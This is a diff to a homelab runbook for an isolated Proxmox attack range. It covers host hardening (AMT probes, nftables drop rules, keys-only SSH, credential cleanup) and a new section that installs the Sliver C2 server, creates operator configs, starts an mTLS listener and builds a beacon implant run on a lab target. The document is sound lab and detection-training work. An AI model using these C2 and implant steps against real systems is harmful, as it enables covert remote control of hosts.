@@ -91,12 +91,45 @@ Never set it up: power it off from the setup screen (Shift+F10, then
   no management plane on this segment, and
   [ADR-0106](../adr/0106-name-the-range-host-gandalf-and-leave-ifrit-to-its-disabled-amt.md)
   keeps the name `ifrit` for this one in case it is ever turned on.
+
+  The firmware setting is the evidence that AMT is disabled. The OS cannot
+  read it: `/dev/mei0` exists either way. What can be checked from off the
+  box is reachability: whether anything answers on AMT's TCP ports at
+  `gandalf`'s address. Run it from `morpheus` while the box is on, one port per
+  call, because FreeBSD's `nc` takes a single port and exits 1 on a usage
+  error as well as on a closed port:
+
+  ```bash
+  sh -c 'for p in 16992 16993 16994 16995 623 664; do nc -vz -w3 10.0.30.30 $p; echo "tcp $p exit=$?"; done'
+  ```
+
+  Each port should report a refusal or a timeout with `exit=1`, and none
+  should report `succeeded`. That shows AMT does not answer at the host's
+  address. The ME answers these ports before Proxmox sees the packet, so the
+  host firewall cannot hide them. It is not proof that AMT is disabled:
+  - AMT that is enabled but unprovisioned need not listen at all.
+  - The UDP side of 623 and 664 (RMCP) is not tested.
+  - An AMT given its own address would not be seen here.
+
+  The *Intel Manageability: Disabled* setting above remains the evidence.
+  The probe backs it up.
+
+  > **Probed 2026-11-22**, after the 2026-11-13 audit of `gandalf` found
+  > AMT's state unproven. A first run put all six ports on one `nc` line,
+  > which FreeBSD's `nc` rejects, so its `exit=1` proved nothing. The
+  > per-port run above, with `gandalf` up since 13:52 that day, gave
+  > `Operation timed out` and `exit=1` on every port, with none `succeeded`.
+  > The timeout, not a refusal, is the host firewall's `DROP`. An ME
+  > listening on the port would have answered before the firewall.
 - **WLAN and Bluetooth off**, or pull the card. ADR-0017 allows one NIC, and
   `lspci` afterwards should list the I219 alone.
 - **VT-x and VT-d on**, and *Configuration Change Detection* off.
-- **After Power Loss: Power Off.** `gandalf` is off between sessions (§7),
-  and nothing alerts when it is left on, so a power cut must not bring it
-  back by itself. A session starts at the power button.
+- **After Power Loss: Power Off.** `gandalf` stays on
+  ([ADR-0125](../adr/0125-keep-gandalf-on-and-stop-ragnarok-on-a-timer.md)) and
+  is monitored now
+  ([ADR-0126](../adr/0126-monitor-gandalf-now-that-it-stays-on.md), [#1651](https://github.com/Gerrrt/HomeLab/issues/1651)).
+  It is still set to stay down after a power cut, so it is up only when someone
+  powers it on; after a cut, it starts at the power button.
 - Secure Boot can stay on, because the Proxmox VE 9 installer is signed.
 
 Install Proxmox VE **onto the 256 GB M.2, not the SATA SSD**
@@ -127,6 +160,31 @@ said "not a mirror", and the range is maintained by nobody. From here on,
 pick it in the *Storage* field when creating each VM, and §6's `clean`
 snapshot is then a ZFS snapshot on that pool. Nothing of the range goes on
 the M.2.
+
+So the installer's `local-lvm` has no use here, and a storage that can hold
+guest disks is one a guest can be put on by mistake. Remove it, after
+checking that nothing is on it and no guest names it:
+
+```bash
+lvs --noheadings -o lv_name,pool_lv pve | awk '$2 == "data" { print }'
+grep -l local-lvm /etc/pve/qemu-server/*.conf /etc/pve/lxc/*.conf 2>/dev/null
+pvesm remove local-lvm
+lvremove -y pve/data
+pvesm status; vgs pve
+```
+
+Both of the first two commands should print nothing. The `awk` lists every
+thin volume whose pool is `data`, and there must be none — `Data%` would read
+`0.00` even if one existed, because an unwritten thin volume uses no data
+blocks, so the list of volumes is the check, not the usage. The `grep` is the
+second belt: no guest config names `local-lvm`.
+After it, `pvesm status` lists `local` and `range` only, and the M.2's
+141 GiB is free space in the `pve` volume group. It is left there rather
+than grown into `/`, because ext4 does not shrink while mounted, and
+nothing on the host needs the room.
+
+> **Ran on `gandalf` 2026-11-22**, from the audit that day, which found the
+> thin pool empty and named by no guest.
 
 **Cap ZFS's read cache.** The installer limits the ARC only when the root is
 ZFS, and here it is not, so by default ZFS may take half of RAM: 16 GB of
@@ -173,15 +231,32 @@ iface vmbr0 inet static
         bridge-ports nic0
         bridge-stp off
         bridge-fd 0
+        ip-forward off
+        ip6-forward off
 
 auto vmbr1
 iface vmbr1 inet manual
         bridge-ports none
         bridge-stp off
         bridge-fd 0
-        pre-up sysctl -q -w net.ipv6.conf.vmbr1.disable_ipv6=1
+        post-up sysctl -q -w net.ipv6.conf.vmbr1.disable_ipv6=1
+        post-up /usr/sbin/nft -f /etc/network/vmbr1-host-in.nft
 
 source /etc/network/interfaces.d/*
+```
+
+`/etc/network/vmbr1-host-in.nft`, which the last line loads:
+
+```text
+table netdev vmbr1_host_in
+delete table netdev vmbr1_host_in
+table netdev vmbr1_host_in {
+        counter dropped { }
+        chain ingress {
+                type filter hook ingress device "vmbr1" priority filter; policy drop;
+                counter name "dropped" drop
+        }
+}
 ```
 
 Two things in there are load-bearing and neither is obvious:
@@ -196,9 +271,40 @@ Two things in there are load-bearing and neither is obvious:
   unreachable neighbour stops being unreachable. `inet manual` covers IPv4
   only. Linux gives every interface that comes up an IPv6 link-local address,
   and an `fe80::` address on `vmbr1` is an on-link endpoint every target can
-  reach without a gateway. The `pre-up` line stops that.
+  reach without a gateway. It also takes router advertisements
+  (`accept_ra` is `1`), so a target or `ragnarok` could hand the host a
+  global address and a route through the range. The `sysctl` line on `vmbr1`
+  stops both. It has to be `post-up`. At boot, `pre-up` runs before
+  `ifupdown2` has created the bridge, so the key does not exist yet, the
+  `sysctl` fails, and the boot carries on with IPv6 on.
 
-The `post-up` line is not isolation. It is the usual workaround for the
+Two more lines close what the address alone does not:
+
+- **`ip-forward off` and `ip6-forward off` on `vmbr0`.** The host routes for
+  no one. The global `ip_forward` is `0`, but IPv4 decides per interface,
+  on the one a packet arrived on. On 2026-11-22 `vmbr0` read
+  `forwarding = 1` in both families while everything else read `0`. Nothing
+  in `sysctl.d` set it, which points at ifupdown2's default for an
+  interface that carries an address. These two lines are ifupdown2's own way
+  to turn it off. There is no route to the range, so it was
+  never a path in, but the host would route between VLAN 30 hosts that sent
+  it a packet to pass on.
+- **The `vmbr1_host_in` table.** No address on `vmbr1` is not the same as
+  nothing from `vmbr1` reaching the host. Linux answers ARP for any of its
+  addresses on any interface, and it accepts a packet for `10.0.30.30` on
+  whichever interface it arrives (`arp_ignore` `0`, and `rp_filter` `2`, which
+  `pve-firewall` sets host-wide). So a target someone has rooted can add an
+  on-link route to `10.0.30.30`, and its packets are delivered to the host.
+  Until this table, the host firewall was what dropped them, and nothing
+  watches that on `gandalf` (§7). The table sits on `vmbr1`'s netdev
+  `ingress` hook. That hook sees only frames the bridge passes up to the host
+  itself, never frames it forwards between two guests. So it drops everything
+  addressed to the host, ARP included, and the targets still reach
+  `ragnarok`. It is loaded from `post-up` because a netdev chain needs its
+  device to exist, and `nftables.service` runs before the bridges do. The
+  first two lines make a reload start clean.
+
+The `post-up` line on `nic0` is not isolation. It is the usual workaround for the
 I219's e1000e transmit hang under load, which would take the range's one
 link down mid-session.
 
@@ -206,11 +312,15 @@ link down mid-session.
 ip -br addr show
 ip addr show dev vmbr1 | grep -c inet
 ethtool -k nic0 | grep -E 'tcp-segmentation-offload|generic-segmentation-offload'
+sysctl net.ipv4.conf.vmbr0.forwarding net.ipv6.conf.vmbr0.forwarding
+nft list chain netdev vmbr1_host_in ingress | grep -c 'policy drop'
 ```
 
 **You should see** `vmbr0` with `10.0.30.30/24`, and **`vmbr1` with no
 address at all**: the `grep -c` prints `0`, so no `inet` and no `inet6`.
-`UNKNOWN` is what an empty bridge reports. Both offloads should read `off`.
+`UNKNOWN` is what an empty bridge reports. Both offloads should read `off`,
+both `vmbr0` forwarding flags `0`, and the last line `1`. §8 check four
+proves the table drops what a target sends to the host.
 
 Then reboot once, which also picks up §1's kernel, and run the same
 commands again, with
@@ -218,8 +328,25 @@ commands again, with
 should have changed. The ARC cap should read `4294967296` and the pool
 should be healthy. On 2026-11-07 the offloads, the ARC cap and the pool held
 across the reboot. `vmbr1` still had an `fe80::` address after that
-reboot. The `pre-up` line was added the same day, from review, and after
-`ifreload -a` the `grep -c` read `0`.
+reboot. A `pre-up` line was added the same day, from review, and after
+`ifreload -a` the `grep -c` read `0`. That proved it with the bridge already
+up, not at boot. The next boot was on 2026-11-22, during the follow-up to the
+2026-11-13 audit. The `pre-up` failed with `cannot stat
+/proc/sys/net/ipv6/conf/vmbr1/disable_ipv6`, and `vmbr1` came up with an
+`fe80::` address and `accept_ra` at `1`. The line is now `post-up`. The check
+that counts is the one after a reboot: `ifreload -a` cannot show a boot-order
+fault.
+Applied on `gandalf` the same day, then proved by a reboot at 15:53. After
+it, `disable_ipv6` read `1`, the `grep -c` read `0`, and the boot's
+networking log had no failed `sysctl`.
+The `ip-forward` lines and the `vmbr1_host_in` table were written later on
+2026-11-22, from the audit that day. As with the `sysctl` line, only a reboot
+followed by the commands above proves them.
+Applied on `gandalf` the same evening with `ifreload -a`, then proved by a
+reboot at 19:21. After it, both `vmbr0` forwarding flags read `0`, the
+`policy drop` count read `1`, `vmbr1` had no address, both offloads were
+`off`, the ARC cap read `4294967296` and the pool was healthy. §8 check four
+proved the table from a target the same night.
 
 Then add the reservation for `10.0.30.30` on `morpheus` alongside the other
 ImaginationLAN statics. `.30` is below `.100` and therefore outside the Kea
@@ -405,7 +532,7 @@ run they record:
 | The `local_network` alias | `10.0.30.20` | `10.0.30.30` |
 | Guest NICs | 140 and 170, by the loop | **None yet**: the node is empty. Clear the flag on each NIC as §5 and §6 create it. `tpl-kali` and its clones carry `firewall=0` from Packer, but a NIC added in the GUI, such as the attack VM's `net1`, defaults to on |
 | The probe from `morpheus` | `10.0.30.20 8006` | `10.0.30.30 8006` |
-| Telemetry, the collector and the alert drill | All three | **None of them.** ADR-0017 gives `gandalf` no agent, so nothing reads the collector's file and the three alerts cannot see it. The check that it stays on is §7's read-back at every power-on |
+| Telemetry, the collector and the alert drill | All three | **All three now**, added by *Monitoring the host* below ([ADR-0126](../adr/0126-monitor-gandalf-now-that-it-stays-on.md), [#1651](https://github.com/Gerrrt/HomeLab/issues/1651)), which supersedes ADR-0017's no-agent: `gandalf` runs its own metrics-only agent, so the collector's file is read and the alerts see it. §7's read-back at every power-on stays as the per-session backstop |
 
 > [!CAUTION]
 > **Enable with a permissive policy first, then flip it.** `pve-firewall
@@ -551,8 +678,9 @@ up{instance="Saruman"}
 reads as a failure when nothing is wrong. Both jobs, `Saruman-metrics` and
 `Saruman-alloy`, should be at `1`.
 
-**Then that it stays on**, on `Saruman` only: `gandalf` has no agent, and §7
-is its check. The probe above is a thing a person does once, and
+**Then that it stays on**: on `Saruman` here, and on `gandalf` through its own
+agent since *Monitoring the host* ([ADR-0126](../adr/0126-monitor-gandalf-now-that-it-stays-on.md)), with §7's read-back as its
+backstop. The probe above is a thing a person does once, and
 the ordinary ways the firewall goes off again — a `pve-firewall stop` while
 debugging a guest, an upgrade rewriting `/etc/pve/firewall`, a rebuild that
 skips this section — page nothing on their own. Install the collector that
@@ -587,9 +715,10 @@ has never fired is a rule nobody knows can.
 The firewall above lets `22` in from Hicks alone. Behind it, Proxmox's
 installer leaves `sshd` taking root's password: `PermitRootLogin yes` in
 `/etc/ssh/sshd_config`, and Debian's `PasswordAuthentication` default of
-`yes`. On `gandalf` nothing watches whether the firewall is on (§7), so if it
-ever goes off, the root password is all that stands between VLAN 30, where the
-attack VM is, and a root shell on the range's isolation host. Keys only takes
+`yes`. On `gandalf` the firewall is watched now ([ADR-0126](../adr/0126-monitor-gandalf-now-that-it-stays-on.md)), but an alert is
+not a barrier: if it ever goes off, the root password would be all that stands
+between VLAN 30, where the attack VM is, and a root shell on the range's
+isolation host. Keys only takes
 that away. An audit on 2026-11-13 found both still on.
 
 Root's password stays set. The `root@pam` login on `8006` uses it, and so does
@@ -613,25 +742,41 @@ printf '%s\n' \
   'PermitRootLogin prohibit-password' \
   'PasswordAuthentication no' \
   'KbdInteractiveAuthentication no' \
+  'X11Forwarding no' \
+  'AllowTcpForwarding no' \
   > /etc/ssh/sshd_config.d/10-keys-only.conf
 sshd -t && systemctl reload ssh
-sshd -T | grep -E '^(permitrootlogin|passwordauthentication|kbdinteractiveauthentication) '
+sshd -T | grep -E '^(permitrootlogin|passwordauthentication|kbdinteractiveauthentication|x11forwarding|allowtcpforwarding) '
 ```
 
 **You should see** `permitrootlogin without-password` (`sshd -T`'s name for
-`prohibit-password`), `passwordauthentication no` and
-`kbdinteractiveauthentication no`. The drop-in wins over the main file's
+`prohibit-password`), `passwordauthentication no`,
+`kbdinteractiveauthentication no`, `x11forwarding no` and
+`allowtcpforwarding no`. The last two keep a root session on the range's
+isolation host from becoming a tunnel. Nothing here needs one, because
+`8006` is reached directly from Hicks. The drop-in applied on 2026-11-22 had
+the first three lines only. The audit that day found both forwardings on
+(Debian's `X11Forwarding yes` and the `AllowTcpForwarding` default), so the
+step is rerun with all five, which was done on 2026-11-22 at 19:19 and read
+back as above. The drop-in wins over the main file's
 `PermitRootLogin yes` because `Include` comes first in `sshd_config` and
 `sshd` keeps the first value it reads. Then, from Hicks, a password login must
 be refused while a key login still works:
 
 ```bash
-ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password root@10.0.30.30 true
-ssh -o PasswordAuthentication=no root@10.0.30.30 true
+ssh -o ControlPath=none -o PubkeyAuthentication=no -o PreferredAuthentications=password root@10.0.30.30 true
+ssh -o ControlPath=none -o PasswordAuthentication=no root@10.0.30.30 true
 ```
 
 The first should fail with `Permission denied (publickey)`, offering no
-password prompt. The second should succeed. If it fails, go back to the shell
+password prompt. The second should succeed. `ControlPath=none` matters on a
+workstation whose SSH config shares connections (`ControlMaster auto`). Without
+it, both commands ride the connection already open, which authenticated
+before the change, and the first "succeeds" with no password at all. On
+2026-11-22 it did exactly that, and only the rerun with `ControlPath=none`
+gave the refusal. The same sharing keeps the old login shell after `chsh`
+below, so close a shared connection (`ssh -O exit root@10.0.30.30`) before
+the next step. If it fails, go back to the shell
 you kept open, remove the drop-in, and run `systemctl reload ssh`.
 
 ### Services on `gandalf`: only what the range uses
@@ -663,6 +808,75 @@ The `ss` output should list `22`, `8006` and `3128` on all addresses, and
 `25` and `85` on loopback only. `chronyd`'s `323` is also loopback only.
 Nothing on `111` should remain. If NFS storage is ever added, unmask and
 enable them first, or the mount will fail.
+
+### Nothing else on `gandalf`
+
+`gandalf` is the box that keeps the attacker's segment away from the estate.
+It shares layer 2 with `ragnarok`. It is monitored now
+([ADR-0126](../adr/0126-monitor-gandalf-now-that-it-stays-on.md) supersedes ADR-0017's no-agent), but the segment it shares is why it still
+holds no estate credential, no GitHub login, no personal tooling and no apt
+repository but Debian's and Proxmox's. Repository work and anything that needs
+a login are done from a Hicks workstation or `phoenix`, never from a shell
+here. Every apt source can install a package that runs as root on the
+isolation host, so a third-party repository is a supply chain the range
+does not need.
+
+The 2026-11-13 audit found a GitHub token, Claude Code credentials and a
+HomeLab checkout here. They were removed before the 2026-11-22 audit, which
+found none of them. It did find a dotfiles install for `root`:
+
+- zsh as the login shell, and `~/.ssh/config` linked into the checkout;
+- an `atuin` daemon, Go toolchains, and tools under `~/.local`;
+- the packages `1password-cli` (signed out), `gh` (logged out), `glow`,
+  `gum`, `netavark` and `skopeo`;
+- the 1Password and Charm apt repositories, and Claude Code's remote-session
+  files under `/root/.claude`.
+
+Remove them, as root on `gandalf`, from a shell opened with `bash` (the login
+shell changes first):
+
+```bash
+chsh -s /bin/bash root
+pkill -x atuin || true
+rm -f /etc/apt/sources.list.d/1password.list /etc/apt/sources.list.d/charm.list \
+      /etc/apt/keyrings/1password.gpg /etc/apt/keyrings/charm.gpg
+apt purge 1password-cli gh glow gum netavark skopeo zsh zsh-common \
+      golang-go golang-src golang-1.24-go golang-1.24-src \
+      golang-github-containers-common golang-github-containers-image
+apt autoremove --purge && apt update
+find /root -maxdepth 3 -lname '*dotgibson*' -print -delete
+rm -rf /root/code /root/.local /root/.config/atuin /root/.config/gh /root/.config/go \
+       /root/.claude /root/.claude.json /root/.ssh/config.d /root/.ssh/sockets \
+       /root/.ssh/config.pre-dotfiles.*
+rm -rf /root/.zshrc /root/.atuin /root/.actual /root/go /root/.npm /root/.w3m /root/.cache \
+       /root/.config/carapace /root/.config/git /root/.config/jj /root/.config/lazygit \
+       /root/.config/mise /root/.config/sesh /root/.config/systemd /root/.config/tealdeer \
+       /root/.config/tmux /root/.config/zsh
+rmdir /root/.config 2>/dev/null || true
+```
+
+The `find` removes the dotfiles' symlinks before the checkout goes, so none
+is left dangling. Keep `/root/.ssh/id_rsa`, `id_rsa.pub` and `known_hosts`:
+they are Proxmox's own node key. Then read it back:
+
+```bash
+ls /etc/apt/sources.list.d/
+getent passwd root | cut -d: -f7
+pgrep -a atuin; command -v gh op zsh
+```
+
+**You should see** only `ceph.sources`, `debian.sources`, `proxmox.sources`
+and `pve-enterprise.sources`, the shell `/bin/bash`, and nothing from the last
+line.
+
+> **Ran on `gandalf` 2026-11-22 at 19:20**, and read back as above. The first
+> `rm` left the second's paths behind: atuin's user unit and history, Go's
+> module cache (888 MB), npm's cache, mise, the tmux plugins and zsh's own
+> files, which the dotfiles install had put outside the symlinks. The second
+> `rm` was added from that run. Together they freed about 5 GB of the root
+> disk. The dotfiles checkout held one local change, the credential helper
+> `gh auth setup-git` writes, and nothing worth keeping. `/root/.bashrc`,
+> `.profile` and `.forward` are Debian's and Proxmox's own, and stay.
 
 ---
 
@@ -820,15 +1034,161 @@ narrow `50 → 30` without the list: Proxmox on `10.0.30.30:8006`, the C2
 operator's interface on the attack VM, and whatever the lab's Grafana and RDP
 into the estate already need on `Saruman`.
 
-As of 2026-11-09 the list is:
+As of 2026-11-22 the list is:
 
 - Proxmox on `10.0.30.30:8006` and SSH on `10.0.30.30:22`, ADR-0014's rules.
 - SSH to `ragnarok` on its lease, port 22.
+- Sliver's operator console on `ragnarok`'s lease, `31337/tcp`
+  ([ADR-0095](../adr/0095-run-sliver-as-the-range-c2-on-the-attack-vm.md), *The
+  C2* below). The lease is not reserved, so a rule written for #228 names the
+  segment, not the address.
 
-Sliver ([ADR-0095](../adr/0095-run-sliver-as-the-range-c2-on-the-attack-vm.md))
-is not installed yet. Its operator port joins the list when it is. The lease
-is not reserved, so a rule written for #228 names the segment, not the
-address.
+### The C2: Sliver on `ragnarok`
+
+The range's command-and-control is Sliver, on the attack VM
+([ADR-0095](../adr/0095-run-sliver-as-the-range-c2-on-the-attack-vm.md)). It is
+chosen to be well-signatured on purpose: the point is for the estate's SOC to
+**catch** the channel, so an early miss is a real gap, not an artefact of an
+exotic tool. One server binary runs as a daemon on `ragnarok`; an operator
+reaches it from a Hicks workstation over the existing `50 → 30` path. Nothing
+new is opened toward the house.
+
+Installing it needs the internet the outbound scope takes away, so lift both
+tables for the install and put them back, as above. Pin the release and verify
+its signature against Sliver's own minisign key, the way this repository trusts
+no third-party binary unchecked. As root on `ragnarok`:
+
+```bash
+set -euo pipefail
+# Put the scope back on any exit, so a failed download or signature check
+# leaves the VM filtered, not open. `set -e` makes curl or minisign abort the
+# block, and the trap still restores the scope.
+trap 'systemctl restart nftables' EXIT
+nft delete table inet range_scope
+nft delete table netdev range_scope_l2
+apt-get install -y minisign
+cd /opt && mkdir -p sliver-dist && cd sliver-dist
+BASE=https://github.com/BishopFox/sliver/releases/download/v1.7.9
+PK='RWTZPg959v3b7tLG7VzKHRB1/QT+d3c71Uzetfa44qAoX5rH7mGoQTTR'
+for f in sliver-server_linux-amd64 sliver-client_linux-amd64; do
+  curl -fSL -o "$f" "$BASE/$f"
+  curl -fSL -o "$f.minisig" "$BASE/$f.minisig"
+  minisign -V -P "$PK" -m "$f"   # non-zero if it does not verify, which set -e catches
+done
+install -m0755 sliver-server_linux-amd64 /usr/local/bin/sliver-server
+install -m0755 sliver-client_linux-amd64 /usr/local/bin/sliver-client
+ln -sf /usr/local/bin/sliver-client /usr/local/bin/sliver
+sliver-server unpack --force
+```
+
+The `trap` restores the outbound scope whether the block finishes or a
+download or signature check fails part way, so an aborted install never leaves
+`ragnarok` without its filter. The server binary generates implants offline,
+so the scope is already back before the first one is built.
+
+The `PK` is Sliver's published minisign public key, taken from its own install
+script (`https://sliver.sh/install`) rather than typed from memory. The server
+binary is large because it carries the compilers it builds implants with, so
+generation is offline — which is why the scope can go back on before the first
+implant is built.
+
+Run the server as a daemon and make an operator config for Hicks (`--lhost` is
+`ragnarok`'s VLAN 30 lease, where the operator connects):
+
+```bash
+cat > /etc/systemd/system/sliver.service <<'UNIT'
+[Unit]
+Description=Sliver C2 server (range, ADR-0095)
+After=network.target
+StartLimitIntervalSec=0
+[Service]
+Type=simple
+Restart=on-failure
+RestartSec=3
+User=root
+ExecStart=/usr/local/bin/sliver-server daemon
+[Install]
+WantedBy=multi-user.target
+UNIT
+chmod 600 /etc/systemd/system/sliver.service
+systemctl daemon-reload && systemctl enable --now sliver.service
+# `operator --save` writes into the directory but does not create it, so make
+# it first (0700: it will hold a client certificate and key).
+install -d -m 0700 /root/.sliver-client/configs
+sliver-server operator --name root --lhost 127.0.0.1 --permissions all --save /root/.sliver-client/configs/
+sliver-server operator --name operator-hicks --lhost "$(ip -4 -o addr show eth0 | awk '{print $4}' | cut -d/ -f1)" --permissions all --save /tmp/operator-hicks.cfg
+```
+
+**Then re-prove the scope** before the beacon. The install's `trap` already
+restored the tables (`systemctl restart nftables` reloads them), and a quick
+local check is:
+
+```bash
+sysctl -n net.ipv4.ip_forward net.ipv6.conf.all.forwarding     # 0 and 0
+nft list tables                                                # both range_scope tables back
+```
+
+But that only shows the tables are loaded, not that egress is actually
+dropped. The proof #1481 asks for is a rerun of
+[`finish-attack-vm.sh`](../../scripts/finish-attack-vm.sh) from `phoenix`,
+which reloads the scope and runs §8's check three: forwarding `0`, no NAT in
+`nft` or legacy `iptables`, and a raw-Ethernet send to `1.1.1.1` that must be
+counted in `out_of_scope` and dropped. Installing Docker would have turned
+forwarding on; Sliver's install does not, and the script is what confirms it.
+**Its checks must pass before the beacon below.**
+
+The operator config `operator-hicks.cfg` is carried to the Hicks workstation
+and imported with `sliver-client import operator-hicks.cfg`; the console is
+then `sliver-client`. The config holds a client certificate and key, so it is
+**never committed** (ADR-0095, [`security.md`](../security.md)): it is a
+credential, like an implant or a profile.
+
+**The operator port is `31337/tcp` on `ragnarok`'s lease**, Sliver's
+multiplayer listener. Add it to the list above. It is reached from Hicks over
+the `50 → 30` path, not from `garuda` (which is defensive, ADR-0091).
+
+A beacon proves the channel works end to end. Start a listener on the range
+bridge, build an implant for a target, run it there, and watch it call back.
+The listener is on `172.30.30.10` (`eth1`, `vmbr1`). **This is a range-local
+C2 reachability proof, not a SOC-visibility one:** the callback stays on
+`vmbr1`, the routeless bridge, which the estate's Zeek never sees — Zeek
+mirrors `Saruman`'s `vmbr0` ([`network.md`](../network.md)), not this one. SOC
+visibility is what an *exercise* measures, when a **domain host on VLAN 30**
+beacons — that callback crosses the segment the SOC watches (ADR-0095), and a
+miss there is a real detection gap. Here the point is only that the C2 runs
+and the scope does not block a legitimate range callback:
+
+```bash
+# in the console (sliver-client), or piped: printf '…\n' | sliver-client
+mtls --lhost 172.30.30.10 --lport 8443
+generate beacon --mtls 172.30.30.10:8443 --os linux --arch amd64 --seconds 5 --save /tmp/rag_beacon
+```
+
+The implant is delivered the way an exercise would — here, over SSH to a
+target on `vmbr1` — and run. Within a few beacon intervals, `beacons` in the
+console lists it. The outbound scope stays **on** for this: the callback is
+`172.30.30.x → 172.30.30.10`, inside the range subnet the scope allows, which
+also shows the scope does not break legitimate range C2.
+
+Keep implants and listeners on `10.0.30.0/24` and `172.30.30.0/24` only
+(ADR-0014): the scope on `ragnarok` enforces it, and a listener bound off those
+subnets is the mis-scope to avoid. Per [`security.md`](../security.md) and the
+`docs/exercises/` rules, exercise files name the framework, transport and
+technique by ATT&CK ID and carry no profiles, implants, operator configs or
+keys.
+
+> **Installed on `ragnarok` 2026-11-22**, v1.7.9, signatures verified. The
+> daemon listens on `31337`. A Linux beacon over mTLS on `172.30.30.10:8443`
+> was run on `ms3-ub1404` (VMID 101, `172.30.30.101`) and called back — a
+> range-local reachability proof on `vmbr1`, not a SOC-visibility one. The
+> target was reverted to `clean` afterwards. The install lifted the scope and
+> `systemctl restart nftables` put it back, with forwarding `0` and a send
+> past the segment refused. The full re-prove — `finish-attack-vm.sh` from
+> `phoenix`, §8 check three, which also exercises the raw-Ethernet path — was
+> not rerun here, because it needs `phoenix`'s credentials; run it before the
+> next session uses the range. The install is on the running VM, so a `tofu`
+> rebuild of `ragnarok` loses it and this subsection is rerun — like the
+> targets, Sliver is VM state, not part of the template.
 
 ---
 
@@ -916,32 +1276,260 @@ Then boot it, run §8's check four on it, power it off and take the snapshot
 
 ## 7. Powering the range
 
-`gandalf` is off between sessions. There is no alert for it being left on, and
-ADR-0017 says why: every rule shape available says "this host is down", which is
-the normal state. Nothing is watching, so the discipline is yours.
+`gandalf` stays on. The attack VM, `ragnarok`, is what stops between sessions
+([ADR-0125](../adr/0125-keep-gandalf-on-and-stop-ragnarok-on-a-timer.md),
+which supersedes ADR-0124's host power-off). A timer on the host stops it at a
+deadline, six hours after it starts by default or what the last
+`range-extend` set (1 to 12 hours ahead), with a warning on every shell, on
+the host and inside the VM, 30 and 5 minutes before
+([#1647](https://github.com/Gerrrt/HomeLab/issues/1647)). Stopping it at the
+end of a session is still the plan. The timer is what happens when the plan
+is forgotten. Two audits found it left running for days (2026-11-13 and
+2026-11-22).
 
 ```text
-on  → read the firewall back → revert every target to `clean` → work → revert → off
+start ragnarok → read the host back → revert every target to `clean` → work → revert → stop ragnarok
+                                                                              ↑
+                    6 h after ragnarok started, or the last range-extend → stopped, by itself
 ```
 
-**Read the firewall back before anything else.** The collector and the alerts
-that keep `Saruman`'s firewall on do not reach `gandalf`, because ADR-0017 gives
-it no agent. So the check §4 hands to Prometheus on `Saruman` is a step here,
-once per session. `pve-firewall status` should read `enabled/running`, and §4's
+The host is monitored now
+([ADR-0126](../adr/0126-monitor-gandalf-now-that-it-stays-on.md), [#1651](https://github.com/Gerrrt/HomeLab/issues/1651)), and the read-back
+below is the per-session backstop on top of it.
+
+**Read the firewall back before anything else.** `gandalf` runs its own
+`pve-firewall-state` collector now ([ADR-0126](../adr/0126-monitor-gandalf-now-that-it-stays-on.md) supersedes ADR-0017's
+no-agent), so the firewall is watched between sessions. The read-back here is
+the belt-and-suspenders check, once per session. `pve-firewall status` should read `enabled/running`, and §4's
 probe from `morpheus`, aimed at `10.0.30.30`, should give `8006 exit=1` and
-`control exit=0`. `sshd -T | grep -E '^(permitrootlogin|passwordauthentication) '`
-should read `without-password` and `no`, because an upgrade that replaces
+`control exit=0`. `sshd -T | grep -E '^(permitrootlogin|passwordauthentication|x11forwarding|allowtcpforwarding) '`
+should read `without-password` and three `no`s, because an upgrade that replaces
 `sshd_config.d` would be as silent as one that rewrites the firewall. Any other
 answer means the session does not start until §4 has been rerun.
+`ip addr show dev vmbr1 | grep -c inet` should print `0` (§2): the host has
+no address on the range. `sysctl net.ipv4.conf.vmbr0.forwarding
+net.ipv6.conf.vmbr0.forwarding` should read `0` twice, and
+`nft list chain netdev vmbr1_host_in ingress | grep -c 'policy drop'` should
+print `1`. Anything else means the session does not start until §2's lines
+have been rerun and checked in `/etc/network/interfaces`.
+`ls /etc/apt/sources.list.d/` should list Debian's and Proxmox's sources
+only (§4, *Nothing else on `gandalf`*).
+`systemctl is-enabled homelab-ragnarok-stop.timer; systemctl is-active
+homelab-ragnarok-stop.timer` should read `enabled` and `active`, and, once
+`ragnarok` is up, `homelab-ragnarok-stop status` should show a deadline in the
+future. A disabled timer puts the attack VM back on discipline alone
+(ADR-0125), so the session does not start until *The attack VM's timer* below
+has been rerun.
 
 **Then check Proxmox's own updates.** `unattended-upgrades` covers Debian's
-packages only (§4, *Services on `gandalf`*). `apt update && apt list
---upgradable` at power-on shows what is waiting from the Proxmox repository,
-and `apt full-upgrade` applies it before the session starts, not during one.
+packages only (§4, *Services on `gandalf`*), daily now that the host stays
+up. `apt update && apt list --upgradable` at the start of a session shows
+what is waiting from the Proxmox repository, and `apt full-upgrade` applies it
+before the session starts, not during one. Nothing else applies them, so a
+month without a session is a month behind.
 A new kernel does nothing until the box boots into it. So if the upgrade
 installed a `proxmox-kernel-*` package, or `/run/reboot-required` exists,
 reboot and start this section again from the top. The firewall read-back runs
 again too, since a reboot is a fresh power-on.
+
+### The attack VM's timer
+
+Install it once, from a Hicks workstation in a checkout of this repository.
+It is three files and a symlink, in three steps. The timer is enabled last,
+after you have seen the deadline it will act on. The first `ssh` removes
+ADR-0124's host power-off timer, if the host still has it:
+
+```bash
+G=root@10.0.30.30
+ssh "$G" 'systemctl disable --now homelab-range-poweroff.timer 2>/dev/null;
+  rm -f /etc/systemd/system/homelab-range-poweroff.service /etc/systemd/system/homelab-range-poweroff.timer \
+        /usr/local/sbin/homelab-range-poweroff /usr/local/sbin/range-extend;
+  rm -rf /run/homelab-range-poweroff; install -d -m 0755 /usr/local/sbin'
+scp scripts/ragnarok-stop.sh "$G":/usr/local/sbin/homelab-ragnarok-stop
+scp systemd/range/homelab-ragnarok-stop.service systemd/range/homelab-ragnarok-stop.timer "$G":/etc/systemd/system/
+ssh "$G" 'chmod 0755 /usr/local/sbin/homelab-ragnarok-stop &&
+  chmod 0644 /etc/systemd/system/homelab-ragnarok-stop.* &&
+  ln -sf /usr/local/sbin/homelab-ragnarok-stop /usr/local/sbin/range-extend &&
+  homelab-ragnarok-stop --self-test >/dev/null && echo self-test-ok &&
+  systemd-analyze verify /etc/systemd/system/homelab-ragnarok-stop.service &&
+  systemctl daemon-reload &&
+  homelab-ragnarok-stop status'
+```
+
+**You should see** `self-test-ok`, no output from `systemd-analyze`, and
+either `ragnarok (VM 130) is not running` or the deadline the timer will act
+on. Nothing acts on it yet, because the timer is not enabled. If `ragnarok`
